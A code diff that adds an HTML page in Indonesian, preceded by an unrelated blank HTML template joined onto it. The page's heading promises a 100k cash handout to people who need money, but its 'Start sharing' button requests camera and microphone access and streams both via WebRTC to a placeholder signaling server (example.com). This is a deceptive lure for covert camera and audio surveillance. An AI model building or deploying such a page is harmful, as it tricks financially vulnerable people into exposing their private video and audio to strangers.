@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>HTML</title>
+  
+  <!-- HTML -->
+  
+
+  <!-- Custom Styles -->
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+  <!-- Project -->
+  <script src="main.js"></script>
+</body>
+</html><!-- share.html — buka di ponsel yang ingin berbagi -->
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <title>Berbagi Kamera — Dengan Izin</title>
+</head>
+<body>
+  <h2>Berbagi dana 100k/(khusus yang butuh uang)</h2>
+  <p>Buka halaman ini di perangkat yang ingin Anda bagikan, lalu klik "Start sharing".</p>
+  <video id="localVideo" autoplay playsinline muted style="width:100%;max-width:360px;"></video>
+  <button id="startBtn">Start sharing</button>
+
+  <script>
+    const startBtn = document.getElementById('startBtn');
+    const localVideo = document.getElementById('localVideo');
+
+    // Placeholder signaling — Anda perlu implementasi server WebSocket sendiri
+    const SIGNALING_SERVER_URL = 'wss://example.com/signaling'; // ganti dengan servermu
+    let pc, ws;
+
+    startBtn.onclick = async () => {
+      startBtn.disabled = true;
+      try {
+        // Minta izin kamera & mic — pengguna akan melihat prompt browser
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        localVideo.srcObject = stream;
+
+        // Buat RTCPeerConnection
+        pc = new RTCPeerConnection();
+
+        // Kirim tiap track ke peer
+        stream.getTracks().forEach(track => pc.addTrack(track, stream));
+
+        // Simple ICE logging
+        pc.onicecandidate = e => {
+          if (e.candidate && ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({ type: 'ice', candidate: e.candidate }));
+          }
+        };
+
+        // Connect to signaling server
+        ws = new WebSocket(SIGNALING_SERVER_URL);
+        ws.onopen = async () => {
+          // Create offer
+          const offer = await pc.createOffer();
+          await pc.setLocalDescription(offer);
+          ws.send(JSON.stringify({ type: 'offer', sdp: offer.sdp }));
+        };
+        ws.onmessage = async (msg) => {
+          const data = JSON.parse(msg.data);
+          if (data.type === 'answer') {
+            await pc.setRemoteDescription({ type: 'answer', sdp: data.sdp });
+          } else if (data.type === 'ice') {
+            try { await pc.addIceCandidate(data.candidate); } catch(e){ console.warn(e); }
+          }
+        };
+
+        ws.onerror = e => console.error('Signaling error', e);
+        ws.onclose = () => console.log('Signaling closed');
+
+      } catch (err) {
+        alert('Gagal mengakses kamera/mikrofon: ' + err.message);
+        startBtn.disabled = false;
+      }
+    };
+  </script>
+</body>
+</html>
